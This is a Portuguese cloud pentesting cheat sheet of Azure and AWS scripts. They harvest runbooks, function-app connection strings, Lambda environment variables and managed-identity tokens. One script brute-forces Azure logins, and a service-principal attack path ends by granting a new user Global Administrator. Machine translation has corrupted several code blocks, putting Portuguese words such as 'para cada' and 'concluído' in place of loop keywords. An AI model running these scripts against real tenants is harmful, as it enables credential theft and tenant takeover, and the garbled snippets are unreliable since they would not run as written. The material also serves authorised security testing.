# Scripts Avançados de Teste de Penetração em Nuvem

Referência: [Cloud Pentesting Cheatsheet por Beau Bullock](https://github.com/dafthack/CloudPentestCheatsheets)

## Runbooks do Azure Automation

### Exportar Todos os Runbooks de Todas as Assinaturas

```powershell
$subs = Get-AzSubscription
Foreach($s in $subs){

$subscriptionid = $s.SubscriptionId

mkdir .\$subscriptionid\

Select-AzSubscription -Subscription $subscriptionid

$runbooks = @()

$autoaccounts = Get-AzAutomationAccount | Select-Object AutomationAccountName,ResourceGroupName

foreach ($i in $autoaccounts){

$runbooks += Get-AzAutomationRunbook -AutomationAccountName $i.AutomationAccountName -ResourceGroupName $i.ResourceGroupName | Select-Object AutomationAccountName,ResourceGroupName,Name

}

foreach($r in $runbooks){

Export-AzAutomationRunbook -AutomationAccountName $r.AutomationAccountName -ResourceGroupName $r.ResourceGroupName -Name $r.Name -OutputFolder .\$subscriptionid\

}
}
```

### Exportar todas as saídas de tarefas de automação

```powershell
$subs = Get-AzSubscription
$jobout = @()
Foreach($s in $subs){

$subscriptionid = $s.SubscriptionId

Select-AzSubscription -Subscription $subscriptionid

$jobs = @()

$autoaccounts = Get-AzAutomationAccount | Selecione o objeto AutomationAccountName,ResourceGroupName
para cada ($i em $autoaccounts){

$jobs += Get-AzAutomationJob $i.AutomationAccountName -ResourceGroupName $i.ResourceGroupName | Selecione o objeto AutomationAccountName,ResourceGroupName,JobId

}
para cada ($r em $jobs){

$jobout += Get-AzAutomationJobOutput -AutomationAccountName $r.AutomationAccountName -ResourceGroupName $r.ResourceGroupName -JobId $r.JobId

}
} Out-File -Encoding ascii joboutputs.txt
```

## Aplicativos de Funções do Azure

### Listar todos os nomes de host dos Aplicativos de Funções

```powershell
$functionapps = Get-AzFunctionApp
foreach($f in $functionapps){

$f.EnabledHostname
}
```

### Extrair informações do Aplicativo de Funções

```powershell
$subs = Get-AzSubscription
$allfunctioninfo = @()
Foreach($s in $subs){

$subscriptionid = $s.SubscriptionId

Select-AzSubscription -Subscription $subscriptionid

$functionapps = Get-AzFunctionApp

foreach($f in $functionapps){

$allfunctioninfo += $f.config | Select-Object AcrUseManagedIdentityCred,AcrUserManagedIdentityId,AppCommandLine,ConnectionString,CorSupportCredentials,CustomActionParameter

$allfunctioninfo += $f.SiteConfig | fl

$allfunctioninfo += $f.ApplicationSettings | fl

$allfunctioninfo += $f.IdentityUserAssignedIdentity.Keys | fl

}
}
$allfunctioninfo
```

## Fluxo de Login com Código de Dispositivo do Azure

### Iniciar Login com Código de Dispositivo

```powershell
$body = @{

"client_id" = "1950a258-227b-4e31-a9cf-717495945fc2"

"resource" = "https://graph.microsoft.com"
}
$UserAgent = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36"
$Headers = @{}
$Headers["User-Agent"] = $UserAgent
$authResponse = Invoke-RestMethod `

-UseBasicParsing `

-Method Post `
-Uri "https://login.microsoftonline.com/common/oauth2/devicecode?api-version=1.0" `
-Headers $Headers `

-Body $body
$authResponse
```

Acesse https://microsoft.com/devicelogin e insira o código.

### Recuperar Tokens de Acesso

```powershell
$body = @{

"client_id" = "1950a258-227b-4e31-a9cf-717495945fc2"

"grant_type" = "urn:ietf:params:oauth:grant-type:device_code"

"code" = $authResponse.device_code
}
$Tokens = Invoke-RestMethod `

-UseBasicParsing `

-Method Post `

-Uri "https://login.microsoftonline.com/Common/oauth2/token?api-version=1.0" `

-Headers $Headers `

-Body $body
$Tokens
```

## Recuperação de Tokens de Identidade Gerenciada do Azure

```powershell
# Do Azure VM
Invoke-WebRequest -Uri 'http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com' -Method GET -Headers @{Metadata="true"} -UseBasicParsing

# Metadados completos da instância
$instance = Invoke-WebRequest -Uri 'http://169.254.169.254/metadata/instance?api-version=2018-02-01' -Method GET -Headers @{Metadata="true"} -UseBasicParsing
$instance
```

## Scripts de Iteração de Regiões da AWS

Crie o arquivo `regions.txt`:
```
us-east-1
us-east-2
us-west-1
us-west-2
ca-central-1
eu-west-1
eu-west-2
eu-west-3
eu-central-1
eu-north-1
ap-southeast-1
ap-southeast-2
ap-south-1
ap-northeast-1
ap-northeast-2
ap-northeast-3
sa-east-1
```

### Listar todos os IPs públicos do EC2

```bash
while read r; do

aws ec2 describe-instances --query=Reservations[].Instances[].PublicIpAddress --region $r | jq -r '.[]' >> ec2-public-ips.txt
concluído < regions.txt
sort -u ec2-public-ips.txt -o ec2-public-ips.txt
```

### Listar todos os endereços DNS do ELB

```bash
while read r; do

aws elbv2 describe-load-balancers --query LoadBalancers[*].DNSName --region $r | jq -r '.[]' >> elb-public-dns.txt

aws elb describe-load-balancers --query LoadBalancerDescriptions[*].DNSName --region $r | jq -r '.[]' >> elb-public-dns.txt
concluído < regions.txt
sort -u elb-public-dns.txt -o elb-public-dns.txt
```

### Listar todos os endereços DNS do RDS

```bash
while read r; do

aws rds describe-db-instances --query=DBInstances[*].Endpoint.Address --region $r | jq -r '.[]' >> rds-public-dns.txt
concluído < regions.txt
sort -u rds-public-dns.txt -o rds-public-dns.txt
```

### Obter saídas do CloudFormation

```bash
while read r; do

aws cloudformation describe-stacks --query 'Stacks[*].[StackName, Description, Parameters, Outputs]' --region $r | jq -r '.[]' >> cloudformation-outputs.txt
concluído < regions.txt
```

## Consultas de análise de consultas jq do ScoutSuite

### Consultas AWS

```bash
# Encontrar todas as variáveis ​​de ambiente do Lambda
for d in */ ; do

tail $d/scoutsuite-results/scoutsuite_results*.js -n +2 | jq '.services.awslambda.regions[].functions[] | select (.env_variables != []) | .arn, .env_variables' >> lambda-all-environment-variables.txt
concluído

# Encontrar buckets S3 listáveis ​​mundialmente
for d in */ ; do

tail $d/scoutsuite-results/scoutsuite_results*.js -n +2 | jq '.account_id, .services.s3.findings."s3-bucket-AuthenticatedUsers-read".items[]' >> s3-buckets-world-listable.txt
concluído

# Encontrar todos os dados de usuários do EC2
for d in */ ; do

tail $d/scoutsuite-results/scoutsuite_results*.js -n +2 | jq '.services.ec2.regions[].vpcs[].instances[] | select (.user_data != null) | .arn, .user_data' >> ec2-instance-all-user-data.txt
concluído

# Encontrar grupos de segurança do EC2 que permitem CIDRs da AWS
for d in */ ; do

tail $d/scoutsuite-results/scoutsuite_results*.js -n +2 | jq '.account_id' >> ec2-security-group-whitelists-aws-cidrs.txt

tail $d/scoutsuite-results/scoutsuite_results*.js -n +2 | jq '.services.ec2.findings."ec2-security-group-whitelists-aws".items' >> ec2-security-group-whitelists-aws-cidrs.txt
done

# Encontrar todos os volumes EBS do EC2 não criptografados
for d in */ ; do

tail $d/scoutsuite-results/scoutsuite_results*.js -n +2 | jq '.services.ec2.regions[].volumes[] | select(.Encrypted == false) | .arn' >> ec2-ebs-volume-not-encrypted.txt
concluído

# Encontrar todos os snapshots do EBS do EC2 não criptografados
para d em */ ; faça

tail $d/scoutsuite-results/scoutsuite_results*.js -n +2 | jq '.services.ec2.regions[].snapshots[] | select(.encrypted == false) | .arn' >> ec2-ebs-snapshot-not-encrypted.txt
concluído
```

### Consultas do Azure

```bash
# Listar todos os nomes de host do Serviço de Aplicativo do Azure
tail scoutsuite_results_azure-tenant-*.js -n +2 | jq -r '.services.appservice.subscriptions[].web_apps[].host_names[]'

# Listar todos os servidores SQL do Azure
tail scoutsuite_results_azure-tenant-*.js -n +2 | jq -jr '.services.sqldatabase.subscriptions[].servers[] | .name,".database.windows.net","\n"'

# Listar todos os nomes de host de máquinas virtuais do Azure
tail scoutsuite_results_azure-tenant-*.js -n +2 | jq -jr '.services.virtualmachines.subscriptions[].instances[] | .name,".",.location,".cloudapp.windows.net","\n"'

# Listar contas de armazenamento
tail scoutsuite_results_azure-tenant-*.js -n +2 | jq -r '.services.storageaccounts.subscriptions[].storage_accounts[] | .name'

# Listar discos criptografados com chaves gerenciadas pela plataforma
tail scoutsuite_results_azure-tenant-*.js -n +2 | jq '.services.virtualmachines.subscriptions[].disks[] | select(.encryption_type = "EncryptionAtRestWithPlatformKey") | .name' > disks-with-pmks.txt
```

## Ataque de força bruta com PowerShell do Azure

```powershell
$userlist = Get-Content userlist.txt
$passlist = Get-Content passlist.txt
$linenumber = 0
$count = $userlist.count
foreach($line in $userlist){

$user = $line

$pass = ConvertTo-SecureString $passlist[$linenumber] -AsPlainText -Force

$current = $linenumber + 1

Write-Host -NoNewline ("`r[" + $current + "/" + $count + "]" + "Tentando: " + $user + " e " + $passlist[$linenumber])

$linenumber++

$Cred = New-Object System.Management.Automation.PSCredential ($user, $pass)

try {

Connect-AzAccount -Credential $Cred -ErrorAction Stop -WarningAction SilentlyContinue

Add-Content valid-creds.txt ($user + "|" + $passlist[$linenumber - 1])

Write-Host -ForegroundColor green ("`nObtivemos algo aqui: $user e " + $passlist[$linenumber - 1])

}

catch {

$Failure = $_.Exception

if ($Failure -match "ID3242") { continue }

else {
Write-Host -ForegroundColor green ("`nObtivemos algo aqui: $user e " + $passlist[$linenumber - 1])

Add-Content valid-creds.txt ($user + "|" + $passlist[$linenumber - 1])

Add-Content valid-creds.txt $Failure.Message

Write-Host -ForegroundColor red $Failure.Message

}
}
}
```

## Caminho de Ataque ao Principal de Serviço

```bash
# Redefinir credencial do principal de serviço
az ad sp credential reset --id <app_id>
az ad sp Lista de credenciais --id <app_id>

# Fazer login como entidade de serviço
az login --service-principal -u "id do aplicativo" -p "senha" --tenant <ID do locatário> --allow-no-subscriptions

# Criar novo usuário no locatário
az ad user create --display-name <nome> --password <senha> --user-principal-name <upn>

# Adicionar usuário ao Administrador Global via Microsoft Graph
$Body="{'principalId':'ID do Objeto de Usuário', 'roleDefinitionId': '62e90394-69f5-4237-9190-012177145e10', 'directoryScopeId': '/'}"
az rest --method POST --uri https://graph.microsoft.com/v1.0/roleManagement/directory/roleAssignments --headers "Content-Type=application/json" --body Corpo
```

## Referência de Ferramentas Adicionais

| Ferramenta | URL | Finalidade |

|------|-----|---------|

| MicroBurst | github.com/NetSPI/MicroBurst | Avaliação de segurança do Azure |

| PowerZure | github.com/hausec/PowerZure | Pós-exploração do Azure |

| ROADTools | github.com/dirkjanm/ROADtools | Enumeração do Azure AD |

| Stormspotter | github.com/Azure/Stormspotter | Mapeamento de caminhos de ataque do Azure |

| MSOLSpray | github.com/dafthack | Ataque de força bruta a senhas do O365 |

| AzureHound | github.com/BloodHoundAD/AzureHound | Caminhos de ataque do Azure AD |

| WeirdAAL | github.com/carnal0wnage/weirdAAL | Enumeração da AWS |

| Pacu | github.com/RhinoSecurityLabs/pacu | Exploração da AWS |
| ScoutSuite | github.com/nccgroup/ScoutSuite | Auditoria multicloud |
| cloud_enum | github.com/initstring/cloud_enum | Descoberta de recursos públicos |
| GitLeaks | github.com/zricethezav/gitleaks | Varredura de segredos |
| TruffleHog | github.com/dxa4481/truffleHog | Varredura de segredos do Git |
| ip2Provider | github.com/oldrho/ip2provider | Identificação de IP na nuvem |

| FireProx | github.com/ustayready/fireprox | Rotação de IP via AWS API Gateway |

## Ambientes de Treinamento Vulneráveis

| Plataforma | URL | Objetivo |

|----------|-----|---------|
| CloudGoat | github.com/RhinoSecurityLabs/cloudgoat | Laboratório vulnerável da AWS |
| SadCloud | github.com/nccgroup/sadcloud | Configurações incorretas do Terraform |
| Flaws Cloud | flaws.cloud | Desafios CTF da AWS |
| Thunder CTF | thunder-ctf.cloud | Desafios CTF do GCP |